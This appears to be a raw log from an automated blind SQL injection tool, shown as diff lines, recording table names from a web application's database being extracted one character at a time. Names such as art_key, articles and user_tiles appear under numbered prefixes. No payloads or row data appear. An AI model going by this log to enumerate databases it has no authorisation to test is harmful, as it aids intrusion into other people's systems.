+[22:48:15] [INFO] retrieved: ___________[22:48:15] [INFO] retrieved: [22:48:38] [INFO] retrieved: 2__________ 1/11 (9%)[22:48:39] [INFO] retrieved: 2__e_______ 2/11 (18%)[22:48:46] [INFO] retrieved: 2_se_______ 3/11 (27%)[22:48:46] [INFO] retrieved: 2use_______ 4/11 (36%)[22:49:05] [INFO] retrieved: 2use___i___ 5/11 (45%)[22:49:17] [INFO] retrieved: 2user__i___ 6/11 (54%)[22:49:18] [INFO] retrieved: 2user_ti___ 7/11 (63%)[22:49:21] [INFO] retrieved: 2user_ti___ 8/11 (72%)[22:49:30] [INFO] retrieved: 2user_til__ 9/11 (81%)[22:49:31] [INFO] retrieved: 2user_tile_ 10/11 (90%)[22:49:33] [INFO] retrieved: 2user_tiles             [22:49:33] [INFO] retrieved: 2user_tiles
+[22:49:33] [INFO] retrieving the length of query output
+[22:49:34] [INFO] retrieved: 8
+[22:49:44] [INFO] retrieved: ________[22:49:44] [INFO] retrieved: [22:50:03] [INFO] retrieved: _a______ 1/8 (12%)[22:50:08] [INFO] retrieved: 3a______ 2/8 (25%)[22:50:16] [INFO] retrieved: 3ar_____ 3/8 (37%)[22:50:19] [INFO] retrieved: 3art____ 4/8 (50%)[22:50:32] [INFO] retrieved: 3art_k__ 5/8 (62%)[22:50:33] [INFO] retrieved: 3art_ke_ 6/8 (75%)[22:50:38] [INFO] retrieved: 3art_key 7/8 (87%)[22:50:38] [INFO] retrieved: 3art_key           [22:50:39] [INFO] retrieved: 3art_key
+[22:50:39] [INFO] retrieving the length of query output
+[22:50:39] [INFO] retrieved: 9
+[22:50:48] [INFO] retrieved: _________[22:50:48] [INFO] retrieved: [22:51:08] [INFO] retrieved: _a_______ 1/9 (11%)[22:51:13] [INFO] retrieved: 3a_______ 2/9 (22%)[22:51:20] [INFO] retrieved: 3ar______ 3/9 (33%)[22:51:26] [INFO] retrieved: 3art_____ 4/9 (44%)[22:51:36] [INFO] retrieved: 3art__e__ 5/9 (55%)[22:51:42] [INFO] retrieved: 3art_te__ 6/9 (66%)[22:51:47] [INFO] retrieved: 3art_te__ 7/9 (77%)[22:51:52] [INFO] retrieved: 3art_tex_ 8/9 (88%)[22:51:55] [INFO] retrieved: 3art_text           [22:51:55] [INFO] retrieved: 3art_text
+[22:51:55] [INFO] retrieving the length of query output
+[22:51:55] [INFO] retrieved: 9
+[22:52:06] [INFO] retrieved: _________[22:52:06] [INFO] retrieved: [22:52:25] [INFO] retrieved: _a_______ 1/9 (11%)[22:52:30] [INFO] retrieved: 3a_______ 2/9 (22%)[22:52:38] [INFO] retrieved: 3ar______ 3/9 (33%)[22:52:40] [INFO] retrieved: 3ar_i____ 4/9 (44%)[22:52:45] [INFO] retrieved: 3arti____ 5/9 (55%)[22:52:46] [INFO] retrieved: 3artic___ 6/9 (66%)[22:52:55] [INFO] retrieved: 3artic_e_ 7/9 (77%)[22:52:59] [INFO] retrieved: 3article_ 8/9 (88%)[22:53:00] [INFO] retrieved: 3articles           [22:53:00] [INFO] retrieved: 3articles
+[22:53:00] [INFO] retrieving the length of query output
+[22:53:00] [INFO] retrieved: 11
+[22:53:08] [INFO] retrieved: ___________[22:53:08] [INFO] retrieved: [22:53:29] [INFO] retrieved: _a_________ 1/11 (9%)[22:53:31] [INFO] retrieved: 3a_________ 2/11 (18%)[22:53:39] [INFO] retrieved: 3ar________ 3/11 (27%)[22:53:44] [INFO] retrieved: 3ar_i______ 4/11 (36%)[22:53:44] [INFO] retrieved: 3arti______ 5/11 (45%)[22:53:46] [INFO] retrieved: 3artic_____ 6/11 (54%)[22:54:02] [INFO] retrieved: 3artic_e___ 7/11 (63%)[22:54:04] [INFO] retrieved: 3artic_es__ 8/11 (72%)[22:54:06] [INFO] retrieved: 3articles__ 9/11 (81%)[22:54:10] [INFO] retrieved: 3articles_1 10/11 (90%)[22:54:15] [INFO] retrieved: 3articles_1             [22:54:15] [INFO] retrieved: 3articles_1
+[22:54:15] [INFO] retrieving the length of query output
+[22:54:15] [INFO] retrieved: 11
+[22:54:23] [INFO] retrieved: ___________[22:54:23] [INFO] retrieved: [22:54:42] [INFO] retrieved: __a________ 1/11 (9%)[22:54:47] [INFO] retrieved: _ca________ 2/11 (18%)[22:54:47] [INFO] retrieved: 3ca________ 3/11 (27%)[22:54:56] [INFO] retrieved: 3cat_______ 4/11 (36%)[22:54:58] [INFO] retrieved: 3cate______ 5/11 (45%)[22:55:10] [INFO] retrieved: 3categ_____ 6/11 (54%)[22:55:14] [INFO] retrieved: 3categ__i__ 7/11 (63%)[22:55:15] [INFO] retrieved: 3catego_i__ 8/11 (72%)[22:55:18] [INFO] retrieved: 3categori__ 9/11 (81%)[22:55:21] [INFO] retrieved: 3categorie_ 10/11 (90%)[22:55:25] [INFO] retrieved: 3categories             [22:55:25] [INFO] retrieved: 3categories
+[22:55:25] [INFO] retrieving the length of query output
+[22:55:25] [INFO] retrieved: 16
+[22:55:38] [INFO] retrieved: ________________[22:55:38] [INFO] retrieved: [22:56:02] [INFO] retrieved: 3_______________ 1/16 (6%)[22:56:02] [INFO] retrieved: 3c______________ 2/16 (12%)[22:56:07] [INFO] retrieved: 3cu_____________ 3/16 (18%)[22:56:10] [INFO] retrieved: 3cus____________ 4/16 (25%)[22:56:26] [INFO] retrieved: 3cus__m_________ 5/16 (31%)[22:56:32] [INFO] retrieved: 3cus_om_________ 6/16 (37%)[22:56:48] [INFO] retrieved: 3custom_________ 7/16 (43%)[22:56:49] [INFO] retrieved: 3custom_s_______ 8/16 (50%)[22:56:49] [INFO] retrieved: 3custom_se______ 9/16 (56%)[22:56:54] [INFO] retrieved: 3custom_se______ 10/16 (62%)[22:57:05] [INFO] retrieved: 3custom_se__i___ 11/16 (68%)[22:57:05] [INFO] retrieved: 3custom_sec_i___ 12/16 (75%)[22:57:18] [INFO] retrieved: 3custom_secti___ 13/16 (81%)[22:57:19] [INFO] retrieved: 3custom_sectio__ 14/16 (87%)[22:57:24] [INFO] retrieved: 3custom_sectio_s 15/16 (93%)[22:57:25] [INFO] retrieved: 3custom_sections             [22:57:26] [INFO] retrieved: 3custom_sections
+[22:57:26] [INFO] retrieving the length of query output
+[22:57:26] [INFO] retrieved: 13
+[22:57:40] [INFO] retrieved: _____________[22:57:40] [INFO] retrieved: [22:58:04] [INFO] retrieved: _c___________ 1/13 (7%)[22:58:04] [INFO] retrieved: 3c___________ 2/13 (15%)[22:58:11] [INFO] retrieved: 3c_s_________ 3/13 (23%)[22:58:12] [INFO] retrieved: 3cus_________ 4/13 (30%)[22:58:34] [INFO] retrieved: 3cus_o_______ 5/13 (38%)[22:58:34] [INFO] retrieved: 3custo_______ 6/13 (46%)[22:58:35] [INFO] retrieved: 3custom______ 7/13 (53%)[22:58:51] [INFO] retrieved: 3custom__i___ 8/13 (61%)[22:58:52] [INFO] retrieved: 3custom__i___ 9/13 (69%)[22:59:05] [INFO] retrieved: 3custom_ti___ 10/13 (76%)[22:59:06] [INFO] retrieved: 3custom_til__ 11/13 (84%)[22:59:08] [INFO] retrieved: 3custom_tile_ 12/13 (92%)[22:59:11] [INFO] retrieved: 3custom_tiles             [22:59:11] [INFO] retrieved: 3custom_tiles
+[22:59:11] [INFO] retrieving the length of query output
+[22:59:11] [INFO] retrieved: 15
+[22:59:22] [INFO] retrieved: _______________[22:59:22] [INFO] retrieved: [22:59:47] [INFO] retrieved: 3______________ 1/15 (6%)[22:59:47] [INFO] retrieved: 3__e___________ 2/15 (13%)[22:59:50] [INFO] retrieved: 3_re___________ 3/15 (20%)[22:59:53] [INFO] retrieved: 3fre___________ 4/15 (26%)[23:00:11] [INFO] retrieved: 3fre___e_______ 5/15 (33%)[23:00:11] [INFO] retrieved: 3fre__se_______ 6/15 (40%)[23:00:11] [INFO] retrieved: 3fre_use_______ 7/15 (46%)[23:00:21] [INFO] retrieved: 3freeuse_______ 8/15 (53%)[23:00:33] [INFO] retrieved: 3freeuser______ 9/15 (60%)[23:00:37] [INFO] retrieved: 3freeuser__i___ 10/15 (66%)[23:00:41] [INFO] retrieved: 3freeuser_ti___ 11/15 (73%)[23:00:50] [INFO] retrieved: 3freeuser_ti_e_ 12/15 (80%)[23:00:55] [INFO] retrieved: 3freeuser_ti_e_ 13/15 (86%)[23:00:58] [INFO] retrieved: 3freeuser_tile_ 14/15 (93%)[23:00:59] [INFO] retrieved: 3freeuser_tiles             [23:00:59] [INFO] retrieved: 3freeuser_tiles
+[23:00:59] [INFO] retrieving the length of query output
+[23:00:59] [INFO] retrieved: 12
+[23:01:11] [INFO] retrieved: ____________[23:01:11] [INFO] retrieved: [23:01:35] [INFO] retrieved: 3___________ 1/12 (8%)[23:01:36] [INFO] retrieved: 3i__________ 2/12 (16%)[23:01:43] [INFO] retrieved: 3im_________ 3/12 (25%)[23:01:43] [INFO] retrieved: 3img________ 4/12 (33%)[23:01:58] [INFO] retrieved: 3img_f______ 5/12 (41%)[23:01:59] [INFO] retrieved: 3img_fb_____ 6/12 (50%)[23:02:00] [INFO] retrieved: 3img_fbi____ 7/12 (58%)[23:02:08] [INFO] retrieved: 3img_fbi____ 8/12 (66%)[23:02:17] [INFO] retrieved: 3img_fbi__e_ 9/12 (75%)[23:02:21] [INFO] retrieved: 3img_fbid_e_ 10/12 (83%)[23:02:21] [INFO] retrieved: 3img_fbidde_ 11/12 (91%)[23:02:27] [INFO] retrieved: 3img_fbidden             [23:02:27] [INFO] retrieved: 3img_fbidden
+[23:02:27] [INFO] retrieving the length of query output
+[23:02:27] [INFO] retrieved: 5
+[23:02:34] [INFO] retrieved: _____[23:02:34] [INFO] retrieved: [23:03:01] [INFO] retrieved: 3____ 1/5 (20%)[23:03:01] [INFO] retrieved: 3_e__ 2/5 (40%)[23:03:05] [INFO] retrieved: 3_ey_ 3/5 (60%)[23:03:05] [INFO] retrieved: 3key_ 4/5 (80%)[23:03:17] [INFO] retrieved: 3keyw           [23:03:17] [INFO] retrieved: 3keyw
+[23:03:17] [INFO] retrieving the length of query output
+[23:03:17] [INFO] retrieved: 13
+[23:03:31] [INFO] retrieved: _____________[23:03:31] [INFO] retrieved: [23:03:55] [INFO] retrieved: 3____________ 1/13 (7%)[23:03:56] [INFO] retrieved: 3_i__________ 2/13 (15%)[23:04:04] [INFO] retrieved: 3_is_________ 3/13 (23%)[23:04:10] [INFO] retrieved: 3lis_________ 4/13 (30%)[23:04:27] [INFO] retrieved: 3lis__s______ 5/13 (38%)[23:04:42] [INFO] retrieved: 3lis__so_____ 6/13 (46%)[23:04:42] [INFO] retrieved: 3lis__so_____ 7/13 (53%)[23:04:42] [INFO] retrieved: 3list_so_____ 8/13 (61%)[23:04:51] [INFO] retrieved: 3list_sou____ 9/13 (69%)[23:05:00] [INFO] retrieved: 3list_sou_c__ 10/13 (76%)[23:05:00] [INFO] retrieved: 3list_sou_ce_ 11/13 (84%)[23:05:01] [INFO] retrieved: 3list_source_ 12/13 (92%)[23:05:06] [INFO] retrieved: 3list_sources             [23:05:06] [INFO] retrieved: 3list_sources
+[23:05:06] [INFO] retrieving the length of query output
+[23:05:06] [INFO] retrieved: 6
+[23:05:16] [INFO] retrieved: ______[23:05:16] [INFO] retrieved: [23:05:41] [INFO] retrieved: 3_____ 1/6 (16%)[23:05:42] [INFO] retrieved: 3_i___ 2/6 (33%)[23:05:50] [INFO] retrieved: 3_is__ 3/6 (50%)[23:05:50] [INFO] retrieved: 3lis__ 4/6 (66%)[23:05:59] [INFO] retrieved: 3lis_s 5/6 (83%)[23:06:06] [INFO] retrieved: 3lists           [23:06:06] [INFO] retrieved: 3lists
+[23:06:06] [INFO] retrieving the length of query output
+[23:06:06] [INFO] retrieved: 13
+[23:06:19] [INFO] retrieved: _____________[23:06:19] [INFO] retrieved: [23:06:40] [INFO] retrieved: __a__________ 1/13 (7%)[23:06:43] [INFO] retrieved: 3_a__________ 2/13 (15%)[23:06:44] [INFO] retrieved: 3_ai_________ 3/13 (23%)[23:06:51] [INFO] retrieved: 3mai_________ 4/13 (30%)[23:07:07] [INFO] retrieved: 3main________ 5/13 (38%)[23:07:07] [INFO] retrieved: 3main_s______ 6/13 (46%)[23:07:20] [INFO] retrieved: 3main_so_____ 7/13 (53%)[23:07:21] [INFO] retrieved: 3main_so_____ 8/13 (61%)[23:07:28] [INFO] retrieved: 3main_so_r___ 9/13 (69%)[23:07:29] [INFO] retrieved: 3main_sour___ 10/13 (76%)[23:07:35] [INFO] retrieved: 3main_sourc__ 11/13 (84%)[23:07:36] [INFO] retrieved: 3main_source_ 12/13 (92%)[23:07:40] [INFO] retrieved: 3main_sources             [23:07:40] [INFO] retrieved: 3main_sources
+[23:07:40] [INFO] retrieving the length of query output
+[23:07:40] [INFO] retrieved: 5
+[23:07:48] [INFO] retrieved: _____[23:07:48] [INFO] retrieved: [23:08:11] [INFO] retrieved: 3____ 1/5 (20%)[23:08:12] [INFO] retrieved: 3_e__ 2/5 (40%)[23:08:18] [INFO] retrieved: 3_ew_ 3/5 (60%)[23:08:21] [INFO] retrieved: 3new_ 4/5 (80%)[23:08:30] [INFO] retrieved: 3news           [23:08:30] [INFO] retrieved: 3news
+[23:08:30] [INFO] retrieving the length of query output
+[23:08:30] [INFO] retrieved: 9
+[23:08:40] [INFO] retrieved: _________[23:08:40] [INFO] retrieved: [23:09:04] [INFO] retrieved: __e______ 1/9 (11%)[23:09:04] [INFO] retrieved: 3_e______ 2/9 (22%)[23:09:17] [INFO] retrieved: 3ne______ 3/9 (33%)[23:09:18] [INFO] retrieved: 3new_____ 4/9 (44%)[23:09:26] [INFO] retrieved: 3news____ 5/9 (55%)[23:09:29] [INFO] retrieved: 3news__a_ 6/9 (66%)[23:09:32] [INFO] retrieved: 3news_ca_ 7/9 (77%)[23:09:40] [INFO] retrieved: 3news_ca_ 8/9 (88%)[23:09:42] [INFO] retrieved: 3news_cat           [23:09:42] [INFO] retrieved: 3news_cat
+[23:09:42] [INFO] retrieving the length of query output
+[23:09:42] [INFO] retrieved: 9
+[23:09:52] [INFO] retrieved: _________[23:09:52] [INFO] retrieved: [23:10:17] [INFO] retrieved: __e______ 1/9 (11%)[23:10:17] [INFO] retrieved: 3_e______ 2/9 (22%)[23:10:32] [INFO] retrieved: 3ne______ 3/9 (33%)[23:10:32] [INFO] retrieved: 3new_____ 4/9 (44%)[23:10:40] [INFO] retrieved: 3news____ 5/9 (55%)[23:10:50] [INFO] retrieved: 3news__e_ 6/9 (66%)[23:10:55] [INFO] retrieved: 3news_ke_ 7/9 (77%)[23:10:57] [INFO] retrieved: 3news_ke_ 8/9 (88%)[23:10:58] [INFO] retrieved: 3news_key           [23:10:58] [INFO] retrieved: 3news_key
+[23:10:58] [INFO] retrieving the length of query output
+[23:10:58] [INFO] retrieved: 7
+[23:11:06] [INFO] retrieved: _______[23:11:06] [INFO] retrieved: [23:11:27] [INFO] retrieved: ___a___ 1/7 (14%)[23:11:30] [INFO] retrieved: 3__a___ 2/7 (28%)[23:11:34] [INFO] retrieved: 3s_a___ 3/7 (42%)[23:11:44] [INFO] retrieved: 3sha___ 4/7 (57%)[23:11:46] [INFO] retrieved: 3sha_e_ 5/7 (71%)[23:11:47] [INFO] retrieved: 3share_ 6/7 (85%)[23:11:50] [INFO] retrieved: 3shares           [23:11:50] [INFO] retrieved: 3shares
+[23:11:50] [INFO] retrieving the length of query output
+[23:11:50] [INFO] retrieved: 8
+[23:12:00] [INFO] retrieved: ________[23:12:00] [INFO] retrieved: [23:12:23] [INFO] retrieved: 3_______ 1/8 (12%)[23:12:29] [INFO] retrieved: 3__u____ 2/8 (25%)
+[23:12:29] [INFO] heuristics detected web page charset 'ascii'
+[23:12:30] [WARNING] unexpected HTTP code '500' detected. Will use (extra) validation step in similar cases
+[23:12:33] [INFO] retrieved: 3_ou____ 3/8 (37%)
+[23:12:36] [WARNING] unexpected HTTP code '302' detected. Will use (extra) validation step in similar cases
+[23:12:41] [ERROR] invalid character detected. retrying..
+[23:12:43] [INFO] retrieved: 3_ou_c__ 4/8 (50%)[23:12:50] [INFO] retrieved: 3_ou_ce_ 5/8 (62%)[23:12:54] [INFO] retrieved: 3_ource_ 6/8 (75%)[23:12:59] [INFO] retrieved: 3source_ 7/8 (87%)[23:13:00] [INFO] retrieved: 3sources           [23:13:00] [INFO] retrieved: 3sources
+[23:13:00] [INFO] retrieving the length of query output
+[23:13:00] [INFO] retrieved: 17
+[23:13:11] [INFO] retrieved: _________________[23:13:11] [INFO] retrieved: [23:13:36] [INFO] retrieved: 3________________ 1/17 (5%)[23:13:43] [INFO] retrieved: 3s_______________ 2/17 (11%)[23:13:44] [INFO] retrieved: 3s_u_____________ 3/17 (17%)[23:13:50] [INFO] retrieved: 3sou_____________ 4/17 (23%)[23:14:01] [INFO] retrieved: 3sou_c___________ 5/17 (29%)[23:14:01] [INFO] retrieved: 3sou_ce__________ 6/17 (35%)[23:14:10] [INFO] retrieved: 3source__________ 7/17 (41%)[23:14:11] [INFO] retrieved: 3sources_________ 8/17 (47%)[23:14:19] [INFO] retrieved: 3sources_i_______ 9/17 (52%)[23:14:21] [INFO] retrieved: 3sources_i_a_____ 10/17 (58%)[23:14:35] [INFO] retrieved: 3sources_ina_____ 11/17 (64%)[23:14:43] [INFO] retrieved: 3sources_ina_____ 12/17 (70%)[23:14:54] [INFO] retrieved: 3sources_inap____ 13/17 (76%)[23:14:55] [INFO] retrieved: 3sources_inap__a_ 14/17 (82%)[23:14:55] [INFO] retrieved: 3sources_inapp_a_ 15/17 (88%)[23:15:07] [INFO] retrieved: 3sources_inapp_ad 16/17 (94%)[23:15:07] [INFO] retrieved: 3sources_inapp_ad             [23:15:07] [INFO] retrieved: 3sources_inapp_ad
+[23:15:07] [INFO] retrieving the length of query output
+[23:15:07] [INFO] retrieved: 7
+[23:15:15] [INFO] retrieved: _______[23:15:15] [INFO] retrieved: [23:15:39] [INFO] retrieved: 3______ 1/7 (14%)[23:15:40] [INFO] retrieved: 3__e___ 2/7 (28%)[23:15:47] [INFO] retrieved: 3_se___ 3/7 (42%)[23:15:47] [INFO] retrieved: 3use___ 4/7 (57%)[23:15:56] [INFO] retrieved: 3use__1 5/7 (71%)[23:16:04] [INFO] retrieved: 3user_1 6/7 (85%)[23:16:07] [INFO] retrieved: 3user_1           [23:16:07] [INFO] retrieved: 3user_1
+[23:16:07] [INFO] retrieving the length of query output
+[23:16:07] [INFO] retrieved: 7
+[23:16:14] [INFO] retrieved: _______[23:16:14] [INFO] retrieved: [23:16:38] [INFO] retrieved: 3______ 1/7 (14%)[23:16:38] [INFO] retrieved: 3__e___ 2/7 (28%)[23:16:46] [INFO] retrieved: 3_se___ 3/7 (42%)[23:16:46] [INFO] retrieved: 3use___ 4/7 (57%)[23:17:07] [INFO] retrieved: 3use__3 5/7 (71%)[23:17:07] [INFO] retrieved: 3user_3 6/7 (85%)[23:17:10] [INFO] retrieved: 3user_3           [23:17:10] [INFO] retrieved: 3user_3
+[23:17:10] [INFO] retrieving the length of query output
+[23:17:10] [INFO] retrieved: 9
+[23:17:19] [INFO] retrieved: _________[23:17:19] [INFO] retrieved: [23:17:42] [INFO] retrieved: 3________ 1/9 (11%)[23:17:43] [INFO] retrieved: 3__e_____ 2/9 (22%)[23:17:49] [INFO] retrieved: 3_se_____ 3/9 (33%)[23:17:49] [INFO] retrieved: 3use_____ 4/9 (44%)[23:18:01] [INFO] retrieved: 3use___a_ 5/9 (55%)[23:18:06] [INFO] retrieved: 3use__ca_ 6/9 (66%)[23:18:14] [INFO] retrieved: 3user_ca_ 7/9 (77%)[23:18:18] [INFO] retrieved: 3user_ca_ 8/9 (88%)[23:18:20] [INFO] retrieved: 3user_cat           [23:18:20] [INFO] retrieved: 3user_cat
+[23:18:20] [INFO] retrieving the length of query output
+[23:18:20] [INFO] retrieved: 15
+[23:18:30] [INFO] retrieved: _______________[23:18:30] [INFO] retrieved: [23:18:54] [INFO] retrieved: 3______________ 1/15 (6%)[23:18:55] [INFO] retrieved: 3__e___________ 2/15 (13%)[23:19:00] [INFO] retrieved: 3u_e___________ 3/15 (20%)[23:19:02] [INFO] retrieved: 3use___________ 4/15 (26%)[23:19:18] [INFO] retrieved: 3use___i_______ 5/15 (33%)[23:19:30] [INFO] retrieved: 3user__i_______ 6/15 (40%)[23:19:31] [INFO] retrieved: 3user_li_______ 7/15 (46%)[23:19:38] [INFO] retrieved: 3user_li_______ 8/15 (53%)[23:19:39] [INFO] retrieved: 3user_lis______ 9/15 (60%)[23:19:55] [INFO] retrieved: 3user_lis_s____ 10/15 (66%)[23:19:59] [INFO] retrieved: 3user_lists____ 11/15 (73%)[23:20:02] [INFO] retrieved: 3user_lists_f__ 12/15 (80%)[23:20:13] [INFO] retrieved: 3user_lists_f__ 13/15 (86%)[23:20:18] [INFO] retrieved: 3user_lists_f_l 14/15 (93%)[23:20:18] [INFO] retrieved: 3user_lists_fol             [23:20:18] [INFO] retrieved: 3user_lists_fol
+[23:20:18] [INFO] retrieving the length of query output
+[23:20:18] [INFO] retrieved: 13
+[23:20:31] [INFO] retrieved: _____________[23:20:31] [INFO] retrieved: [23:20:54] [INFO] retrieved: 3____________ 1/13 (7%)[23:20:55] [INFO] retrieved: 3__e_________ 2/13 (15%)[23:21:01] [INFO] retrieved: 3_se_________ 3/13 (23%)[23:21:02] [INFO] retrieved: 3use_________ 4/13 (30%)[23:21:24] [INFO] retrieved: 3use__s______ 5/13 (38%)[23:21:31] [INFO] retrieved: 3user_s______ 6/13 (46%)[23:21:32] [INFO] retrieved: 3user_so_____ 7/13 (53%)[23:21:38] [INFO] retrieved: 3user_so_____ 8/13 (61%)[23:21:47] [INFO] retrieved: 3user_so__c__ 9/13 (69%)[23:21:47] [INFO] retrieved: 3user_sou_c__ 10/13 (76%)[23:21:49] [INFO] retrieved: 3user_sou_ce_ 11/13 (84%)[23:21:52] [INFO] retrieved: 3user_source_ 12/13 (92%)[23:22:04] [INFO] retrieved: 3user_sources             [23:22:04] [INFO] retrieved: 3user_sources
+[23:22:04] [INFO] retrieving the length of query output
+[23:22:04] [INFO] retrieved: 11
+[23:22:13] [INFO] retrieved: ___________[23:22:13] [INFO] retrieved: [23:22:37] [INFO] retrieved: 3__________ 1/11 (9%)[23:22:38] [INFO] retrieved: 3__e_______ 2/11 (18%)[23:22:45] [INFO] retrieved: 3_se_______ 3/11 (27%)[23:22:46] [INFO] retrieved: 3use_______ 4/11 (36%)[23:23:02] [INFO] retrieved: 3use___i___ 5/11 (45%)[23:23:14] [INFO] retrieved: 3user__i___ 6/11 (54%)[23:23:15] [INFO] retrieved: 3user_ti___ 7/11 (63%)[23:23:22] [INFO] retrieved: 3user_ti___ 8/11 (72%)[23:23:28] [INFO] retrieved: 3user_til__ 9/11 (81%)[23:23:29] [INFO] retrieved: 3user_tile_ 10/11 (90%)[23:23:32] [INFO] retrieved: 3user_tiles             [23:23:32] [INFO] retrieved: 3user_tiles
+[23:23:32] [INFO] retrieving the length of query output
+[23:23:32] [INFO] retrieved: 8
+[23:23:42] [INFO] retrieved: ________[23:23:42] [INFO] retrieved: [23:24:03] [INFO] retrieved: _a______ 1/8 (12%)[23:24:12] [INFO] retrieved: 4a______ 2/8 (25%)[23:24:13] [INFO] retrieved: 4ar_____ 3/8 (37%)[23:24:18] [INFO] retrieved: 4art____ 4/8 (50%)[23:24:29] [INFO] retrieved: 4art__e_ 5/8 (62%)[23:24:35] [INFO] retrieved: 4art_ke_ 6/8 (75%)[23:24:36] [INFO] retrieved: 4art_key 7/8 (87%)[23:24:38] [INFO] retrieved: 4art_key           [23:24:38] [INFO] retrieved: 4art_key
+[23:24:38] [INFO] retrieving the length of query output
+[23:24:38] [INFO] retrieved: 9
+[23:24:47] [INFO] retrieved: _________[23:24:47] [INFO] retrieved: [23:25:06] [INFO] retrieved: _a_______ 1/9 (11%)[23:25:15] [INFO] retrieved: 4a_______ 2/9 (22%)[23:25:17] [INFO] retrieved: 4ar______ 3/9 (33%)[23:25:21] [INFO] retrieved: 4art_____ 4/9 (44%)[23:25:32] [INFO] retrieved: 4art__e__ 5/9 (55%)[23:25:43] [INFO] retrieved: 4art_te__ 6/9 (66%)[23:25:48] [INFO] retrieved: 4art_te__ 7/9 (77%)[23:25:52] [INFO] retrieved: 4art_tex_ 8/9 (88%)[23:25:52] [INFO] retrieved: 4art_text           [23:25:52] [INFO] retrieved: 4art_text
+[23:25:52] [INFO] retrieving the length of query output
+[23:25:52] [INFO] retrieved: 9
+[23:26:02] [INFO] retrieved: _________[23:26:02] [INFO] retrieved: [23:26:21] [INFO] retrieved: _a_______ 1/9 (11%)[23:26:32] [INFO] retrieved: 4a_______ 2/9 (22%)[23:26:33] [INFO] retrieved: 4ar______ 3/9 (33%)[23:26:36] [INFO] retrieved: 4ar_i____ 4/9 (44%)[23:26:39] [INFO] retrieved: 4arti____ 5/9 (55%)[23:26:49] [INFO] retrieved: 4artic___ 6/9 (66%)[23:26:50] [INFO] retrieved: 4artic_e_ 7/9 (77%)[23:26:55] [INFO] retrieved: 4artic_es 8/9 (88%)[23:26:55] [INFO] retrieved: 4articles           [23:26:55] [INFO] retrieved: 4articles
+[23:26:55] [INFO] retrieving the length of query output
+[23:26:55] [INFO] retrieved: 11
+[23:27:04] [INFO] retrieved: ___________[23:27:04] [INFO] retrieved: [23:27:24] [INFO] retrieved: _a_________ 1/11 (9%)[23:27:33] [INFO] retrieved: 4a_________ 2/11 (18%)[23:27:35] [INFO] retrieved: 4ar________ 3/11 (27%)[23:27:40] [INFO] retrieved: 4ar_i______ 4/11 (36%)[23:27:40] [INFO] retrieved: 4arti______ 5/11 (45%)[23:27:50] [INFO] retrieved: 4artic_____ 6/11 (54%)[23:27:56] [INFO] retrieved: 4artic_e___ 7/11 (63%)[23:27:59] [INFO] retrieved: 4article___ 8/11 (72%)[23:28:02] [INFO] retrieved: 4articles__ 9/11 (81%)[23:28:05] [INFO] retrieved: 4articles_1 10/11 (90%)[23:28:13] [INFO] retrieved: 4articles_1             [23:28:13] [INFO] retrieved: 4articles_1
+[23:28:13] [INFO] retrieving the length of query output
+[23:28:13] [INFO] retrieved: 11
+[23:28:22] [INFO] retrieved: ___________[23:28:22] [INFO] retrieved: [23:28:42] [INFO] retrieved: __a________ 1/11 (9%)[23:28:47] [INFO] retrieved: _ca________ 2/11 (18%)[23:28:51] [INFO] retrieved: 4ca________ 3/11 (27%)[23:28:59] [INFO] retrieved: 4cat_______ 4/11 (36%)[23:28:59] [INFO] retrieved: 4cate______ 5/11 (45%)[23:29:07] [INFO] retrieved: 4categ_____ 6/11 (54%)[23:29:16] [INFO] retrieved: 4categ__i__ 7/11 (63%)[23:29:20] [INFO] retrieved: 4catego_i__ 8/11 (72%)[23:29:22] [INFO] retrieved: 4categori__ 9/11 (81%)[23:29:23] [INFO] retrieved: 4categorie_ 10/11 (90%)[23:29:29] [INFO] retrieved: 4categories             [23:29:29] [INFO] retrieved: 4categories
+[23:29:29] [INFO] retrieving the length of query output
+[23:29:29] [INFO] retrieved: 16
+[23:29:42] [INFO] retrieved: ________________[23:29:42] [INFO] retrieved: [23:30:07] [INFO] retrieved: _c______________ 1/16 (6%)[23:30:12] [INFO] retrieved: 4c______________ 2/16 (12%)[23:30:12] [INFO] retrieved: 4cu_____________ 3/16 (18%)[23:30:13] [INFO] retrieved: 4cus____________ 4/16 (25%)[23:30:34] [INFO] retrieved: 4cust___________ 5/16 (31%)[23:30:36] [INFO] retrieved: 4cust_m_________ 6/16 (37%)[23:30:39] [INFO] retrieved: 4custom_________ 7/16 (43%)[23:30:52] [INFO] retrieved: 4custom__e______ 8/16 (50%)[23:30:53] [INFO] retrieved: 4custom__e______ 9/16 (56%)[23:30:55] [INFO] retrieved: 4custom_se______ 10/16 (62%)[23:30:56] [INFO] retrieved: 4custom_sec_____ 11/16 (68%)[23:31:10] [INFO] retrieved: 4custom_sec_i___ 12/16 (75%)[23:31:18] [INFO] retrieved: 4custom_secti___ 13/16 (81%)[23:31:21] [INFO] retrieved: 4custom_sectio__ 14/16 (87%)[23:31:23] [INFO] retrieved: 4custom_section_ 15/16 (93%)[23:31:26] [INFO] retrieved: 4custom_sections             [23:31:26] [INFO] retrieved: 4custom_sections
+[23:31:26] [INFO] retrieving the length of query output
+[23:31:26] [INFO] retrieved: 13
+[23:31:38] [INFO] retrieved: _____________[23:31:38] [INFO] retrieved: [23:32:02] [INFO] retrieved: _c___________ 1/13 (7%)[23:32:10] [INFO] retrieved: 4c___________ 2/13 (15%)[23:32:11] [INFO] retrieved: 4cu__________ 3/13 (23%)[23:32:11] [INFO] retrieved: 4cus_________ 4/13 (30%)[23:32:34] [INFO] retrieved: 4cust________ 5/13 (38%)[23:32:36] [INFO] retrieved: 4cust_m______ 6/13 (46%)[23:32:41] [INFO] retrieved: 4custom______ 7/13 (53%)[23:32:52] [INFO] retrieved: 4custom__i___ 8/13 (61%)[23:32:55] [INFO] retrieved: 4custom__i___ 9/13 (69%)[23:33:02] [INFO] retrieved: 4custom_ti___ 10/13 (76%)[23:33:07] [INFO] retrieved: 4custom_til__ 11/13 (84%)[23:33:07] [INFO] retrieved: 4custom_tile_ 12/13 (92%)[23:33:11] [INFO] retrieved: 4custom_tiles             [23:33:11] [INFO] retrieved: 4custom_tiles
+[23:33:11] [INFO] retrieving the length of query output
+[23:33:11] [INFO] retrieved: 15
